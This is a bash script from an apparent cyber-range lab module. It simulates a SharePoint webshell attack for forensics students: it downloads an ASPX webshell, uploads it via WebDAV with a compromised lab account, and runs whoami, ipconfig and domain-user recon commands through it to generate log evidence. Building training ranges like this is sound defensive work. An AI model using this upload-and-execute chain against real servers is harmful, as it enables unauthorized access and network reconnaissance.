#!/bin/bash
# =============================================================================
# Module 01 — SharePoint Webshell Attack Simulation
# OpenRaptor Cyber Range — OD@CIRT.APAC
#
# This script simulates a webshell attack against SharePoint.
# It uploads a benign ASPX webshell and executes reconnaissance commands
# to generate the evidence trail that students will investigate.
#
# PRE-REQUISITES:
#   - j.chen AD account exists (created by lab_01_setup.ps1 on DC01)
#   - SP01 is running and reachable at sharepoint.norca.click
#   - curl is installed on Kali
#
# SAFE: This script uses a benign webshell for training purposes only.
# =============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

SP_URL="http://sharepoint.norca.click"
WEBSHELL_PATH="/Shared%20Documents/help.aspx"
CREDS="NORCA\\j.chen:<YOUR_STUDENT_PASSWORD>"
PAYLOAD_REPO_URL="https://github.com/birdforce14d/OpenRaptor/raw/main/module-01/payloads/help.aspx"
WEBSHELL_FILE="$(dirname "$0")/payloads/help.aspx"

# Download webshell if not already present
if [ ! -f "$WEBSHELL_FILE" ]; then
    echo -e "${YELLOW}[0/4] Downloading webshell payload...${NC}"
    mkdir -p "$(dirname "$WEBSHELL_FILE")"
    if curl -sL -o "$WEBSHELL_FILE" "$PAYLOAD_REPO_URL" 2>/dev/null && [ -s "$WEBSHELL_FILE" ]; then
        echo -e "${GREEN}[✓] Payload downloaded${NC}"
    else
        echo -e "${RED}[✗] Download failed. Get the file manually from the student repo.${NC}"
        exit 1
    fi
fi

echo -e "${YELLOW}╔══════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║  Module 01 — Webshell Attack Simulation      ║${NC}"
echo -e "${YELLOW}║  Target: SharePoint (win-norca-sp01)         ║${NC}"
echo -e "${YELLOW}║  Account: j.chen (compromised)               ║${NC}"
echo -e "${YELLOW}╚══════════════════════════════════════════════╝${NC}"
echo ""

# Step 1: Upload webshell
echo -e "${YELLOW}[1/4] Uploading webshell via WebDAV...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --ntlm -u "$CREDS" \
  -T "$WEBSHELL_FILE" \
  "${SP_URL}${WEBSHELL_PATH}")

if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 201 ] || [ "$HTTP_CODE" -eq 204 ]; then
  echo -e "${GREEN}[✓] Webshell uploaded (HTTP $HTTP_CODE)${NC}"
else
  echo -e "${RED}[✗] Upload failed (HTTP $HTTP_CODE)${NC}"
  echo "    Check: Is SP01 running? Is j.chen account created? Is WebDAV enabled?"
  exit 1
fi

sleep 2

# Step 2: Test webshell - whoami
echo -e "${YELLOW}[2/4] Executing: whoami${NC}"
RESULT=$(curl -s --ntlm -u "$CREDS" \
  -d "cmd=whoami&run=Run" \
  "${SP_URL}${WEBSHELL_PATH}" | grep -oP '(?<=<pre>).*(?=</pre>)' || echo "(output parsed)")
echo -e "${GREEN}[✓] Response received${NC}"

sleep 1

# Step 3: Recon - ipconfig
echo -e "${YELLOW}[3/4] Executing: ipconfig /all${NC}"
curl -s --ntlm -u "$CREDS" \
  -d "cmd=ipconfig+/all&run=Run" \
  "${SP_URL}${WEBSHELL_PATH}" > /dev/null
echo -e "${GREEN}[✓] Response received${NC}"

sleep 1

# Step 4: Recon - domain users
echo -e "${YELLOW}[4/4] Executing: net user /domain${NC}"
curl -s --ntlm -u "$CREDS" \
  -d "cmd=net+user+/domain&run=Run" \
  "${SP_URL}${WEBSHELL_PATH}" > /dev/null
echo -e "${GREEN}[✓] Response received${NC}"

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  [✓] Attack simulation complete              ║${NC}"
echo -e "${GREEN}║                                              ║${NC}"
echo -e "${GREEN}║  Evidence generated:                         ║${NC}"
echo -e "${GREEN}║  • WebDAV upload in IIS logs                 ║${NC}"
echo -e "${GREEN}║  • POST requests to help.aspx in IIS logs    ║${NC}"
echo -e "${GREEN}║  • Process creation events (w3wp→cmd.exe)    ║${NC}"
echo -e "${GREEN}║  • Authentication events for j.chen          ║${NC}"
echo -e "${GREEN}║                                              ║${NC}"
echo -e "${GREEN}║  Wait 2-3 minutes for logs to flush,         ║${NC}"
echo -e "${GREEN}║  then begin your investigation.              ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
